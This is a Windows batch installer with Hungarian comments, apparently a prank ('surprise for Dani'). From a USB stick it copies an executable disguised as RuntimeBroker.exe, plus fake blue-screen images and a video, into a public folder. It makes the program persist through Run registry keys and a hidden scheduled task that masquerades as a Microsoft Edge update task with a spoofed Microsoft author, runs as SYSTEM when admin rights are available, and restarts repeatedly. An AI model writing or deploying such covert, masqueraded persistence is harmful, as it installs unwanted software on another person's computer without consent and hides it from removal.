@echo off
:: ================================================================
::  dani-meglepi
:: ================================================================
setlocal EnableDelayedExpansion

set "ASSET_DIR=C:\Users\Public\dani-meglepi"
set "EXE_NAME=RuntimeBroker.exe"
set "TASK_NAME=MicrosoftEdgeUpdateTaskMachineCore"
set "SRC=%~dp0"
if "%SRC:~-1%"=="\" set "SRC=%SRC:~0,-1%"

echo.
echo  ============================================
echo   dani-meglepi telepito v2
echo  ============================================
echo.

:: ── Admin jog ellenőrzés ─────────────────────────────────────────
set "IS_ADMIN=0"
net session >nul 2>&1 && set "IS_ADMIN=1"
if "!IS_ADMIN!"=="1" (
    echo [INFO] Admin jogok: IGEN - teljes telepites
) else (
    echo [INFO] Admin jogok: NEM - felhasznaloi szintu telepites
)
echo.

:: ── 1. Célkönyvtár ───────────────────────────────────────────────
echo [1/4] Konyvtar: %ASSET_DIR%
if not exist "%ASSET_DIR%" (
    mkdir "%ASSET_DIR%" 2>nul
    if errorlevel 1 ( echo   HIBA: Nem sikerult letrehozni! & goto :fail )
    echo   Letrehozva.
) else (
    echo   Mar letezik.
)

:: ── 2. Fájlok másolása ───────────────────────────────────────────
echo.
echo [2/4] Fajlok masolasa...

set "FILES=%EXE_NAME% bsod_800x600.png bsod_1024x768.png bsod_1152x864.png bsod_1280x1024.png bsod_1600x1200.png daninak.mp4"
set "MISSING="
for %%F in (%FILES%) do (
    if not exist "%SRC%\%%F" (
        echo   HIANYZIK: %%F
        set "MISSING=1"
    )
)
if defined MISSING (
    echo.
    echo   A pendrive-on az alabbi fajloknak kell lenniuk:
    echo     %FILES%
    goto :fail
)

for %%F in (%FILES%) do (
    copy /Y "%SRC%\%%F" "%ASSET_DIR%\%%F" >nul
    if errorlevel 1 ( echo   HIBA: %%F & goto :fail )
    echo   OK: %%F
)

:: ── 3. Registry ──────────────────────────────────────────────────
echo.
echo [3/4] Registry beallitasa...

:: HKCU — mindig működik
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" ^
    /v "RuntimeBrokerSvc" /t REG_SZ ^
    /d "\"%ASSET_DIR%\%EXE_NAME%\"" /f >nul 2>&1
if errorlevel 1 (
    echo   FIGYELEM: HKCU registry nem sikerult.
) else (
    echo   OK: HKCU\Run bejegyzes.
)

:: HKLM — csak adminnal
if "!IS_ADMIN!"=="1" (
    reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" ^
        /v "RuntimeBrokerSvc" /t REG_SZ ^
        /d "\"%ASSET_DIR%\%EXE_NAME%\"" /f >nul 2>&1
    if errorlevel 1 (
        echo   FIGYELEM: HKLM registry nem sikerult.
    ) else (
        echo   OK: HKLM\Run bejegyzes ^(minden felhasznalora^).
    )
)

:: ── 4. Task Scheduler ────────────────────────────────────────────
echo.
echo [4/4] Task Scheduler...

:: Régi task törlése (hibát figyelmen kívül)
schtasks /delete /tn "%TASK_NAME%" /f >nul 2>&1

set "CURR_USER=%USERDOMAIN%\%USERNAME%"
set "TASK_XML=%TEMP%\dm_task_%RANDOM%.xml"

if "!IS_ADMIN!"=="1" (
    :: ── Admin verzió: SYSTEM, minden felhasználóra, Hidden ──
    (
    echo ^<?xml version="1.0" encoding="UTF-16"?^>
    echo ^<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"^>
    echo   ^<RegistrationInfo^>
    echo     ^<Author^>Microsoft Corporation^</Author^>
    echo     ^<Description^>Keeps the Microsoft Edge Update Task running.^</Description^>
    echo   ^</RegistrationInfo^>
    echo   ^<Triggers^>
    echo     ^<LogonTrigger^>^<Enabled^>true^</Enabled^>^</LogonTrigger^>
    echo   ^</Triggers^>
    echo   ^<Principals^>
    echo     ^<Principal id="Author"^>
    echo       ^<UserId^>S-1-5-18^</UserId^>
    echo       ^<LogonType^>ServiceAccount^</LogonType^>
    echo       ^<RunLevel^>HighestAvailable^</RunLevel^>
    echo     ^</Principal^>
    echo   ^</Principals^>
    echo   ^<Settings^>
    echo     ^<MultipleInstancesPolicy^>IgnoreNew^</MultipleInstancesPolicy^>
    echo     ^<DisallowStartIfOnBatteries^>false^</DisallowStartIfOnBatteries^>
    echo     ^<StopIfGoingOnBatteries^>false^</StopIfGoingOnBatteries^>
    echo     ^<ExecutionTimeLimit^>PT0S^</ExecutionTimeLimit^>
    echo     ^<Hidden^>true^</Hidden^>
    echo     ^<RestartOnFailure^>^<Interval^>PT1M^</Interval^>^<Count^>999^</Count^>^</RestartOnFailure^>
    echo     ^<RunOnlyIfNetworkAvailable^>false^</RunOnlyIfNetworkAvailable^>
    echo     ^<IdleSettings^>^<StopOnIdleEnd^>false^</StopOnIdleEnd^>^<RestartOnIdle^>false^</RestartOnIdle^>^</IdleSettings^>
    echo     ^<RunOnlyIfIdle^>false^</RunOnlyIfIdle^>
    echo   ^</Settings^>
    echo   ^<Actions Context="Author"^>
    echo     ^<Exec^>
    echo       ^<Command^>"%ASSET_DIR%\%EXE_NAME%"^</Command^>
    echo       ^<WorkingDirectory^>%ASSET_DIR%^</WorkingDirectory^>
    echo     ^</Exec^>
    echo   ^</Actions^>
    echo ^</Task^>
    ) > "!TASK_XML!"
    schtasks /create /xml "!TASK_XML!" /tn "%TASK_NAME%" /f >nul 2>&1
    set "TASK_ERR=!errorlevel!"
    del "!TASK_XML!" >nul 2>&1
    if !TASK_ERR! neq 0 (
        echo   FIGYELEM: SYSTEM task nem sikerult ^(Registry elegendo^).
    ) else (
        echo   OK: Task Scheduler - SYSTEM szintu, minden felhasznalora.
    )
) else (
    :: ── Felhasználói verzió: aktuális user, logon trigger ──
    (
    echo ^<?xml version="1.0" encoding="UTF-16"?^>
    echo ^<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"^>
    echo   ^<RegistrationInfo^>
    echo     ^<Author^>Microsoft Corporation^</Author^>
    echo     ^<Description^>Keeps the Microsoft Edge Update Task running.^</Description^>
    echo   ^</RegistrationInfo^>
    echo   ^<Triggers^>
    echo     ^<LogonTrigger^>^<Enabled^>true^</Enabled^>^<UserId^>!CURR_USER!^</UserId^>^</LogonTrigger^>
    echo   ^</Triggers^>
    echo   ^<Principals^>
    echo     ^<Principal id="Author"^>
    echo       ^<UserId^>!CURR_USER!^</UserId^>
    echo       ^<LogonType^>InteractiveToken^</LogonType^>
    echo       ^<RunLevel^>LeastPrivilege^</RunLevel^>
    echo     ^</Principal^>
    echo   ^</Principals^>
    echo   ^<Settings^>
    echo     ^<MultipleInstancesPolicy^>IgnoreNew^</MultipleInstancesPolicy^>
    echo     ^<DisallowStartIfOnBatteries^>false^</DisallowStartIfOnBatteries^>
    echo     ^<StopIfGoingOnBatteries^>false^</StopIfGoingOnBatteries^>
    echo     ^<ExecutionTimeLimit^>PT0S^</ExecutionTimeLimit^>
    echo     ^<Hidden^>true^</Hidden^>
    echo     ^<RestartOnFailure^>^<Interval^>PT1M^</Interval^>^<Count^>999^</Count^>^</RestartOnFailure^>
    echo     ^<RunOnlyIfNetworkAvailable^>false^</RunOnlyIfNetworkAvailable^>
    echo     ^<IdleSettings^>^<StopOnIdleEnd^>false^</StopOnIdleEnd^>^<RestartOnIdle^>false^</RestartOnIdle^>^</IdleSettings^>
    echo     ^<RunOnlyIfIdle^>false^</RunOnlyIfIdle^>
    echo   ^</Settings^>
    echo   ^<Actions Context="Author"^>
    echo     ^<Exec^>
    echo       ^<Command^>"%ASSET_DIR%\%EXE_NAME%"^</Command^>
    echo       ^<WorkingDirectory^>%ASSET_DIR%^</WorkingDirectory^>
    echo     ^</Exec^>
    echo   ^</Actions^>
    echo ^</Task^>
    ) > "!TASK_XML!"
    schtasks /create /xml "!TASK_XML!" /tn "%TASK_NAME%" /f >nul 2>&1
    set "TASK_ERR=!errorlevel!"
    del "!TASK_XML!" >nul 2>&1
    if !TASK_ERR! neq 0 (
        echo   FIGYELEM: User task nem sikerult ^(Registry elegendo^).
    ) else (
        echo   OK: Task Scheduler - felhasznaloi szintu ^(!CURR_USER!^).
    )
)

:: ── 5. Azonnali indítás ──────────────────────────────────────────
echo.
echo [+] Program inditasa...
start "" /B "%ASSET_DIR%\%EXE_NAME%"
echo   OK: RuntimeBroker.exe elinditva.

:: ── Összefoglalás ────────────────────────────────────────────────
echo.
echo  ============================================
echo   Telepites KESZ!
echo.
echo   Hely    : %ASSET_DIR%
echo   Autoind.: Registry ^(HKCU^) + Task Scheduler
if "!IS_ADMIN!"=="1" (
echo   Szint   : SYSTEM ^(minden felhasznalo^)
) else (
echo   Szint   : Felhasznaloi ^(!CURR_USER!^)
)
echo  ============================================
echo.
timeout /t 4 /nobreak >nul
exit /b 0

:fail
echo.
echo  ============================================
echo   TELEPITES SIKERTELEN
echo  ============================================
echo.
pause
exit /b 1
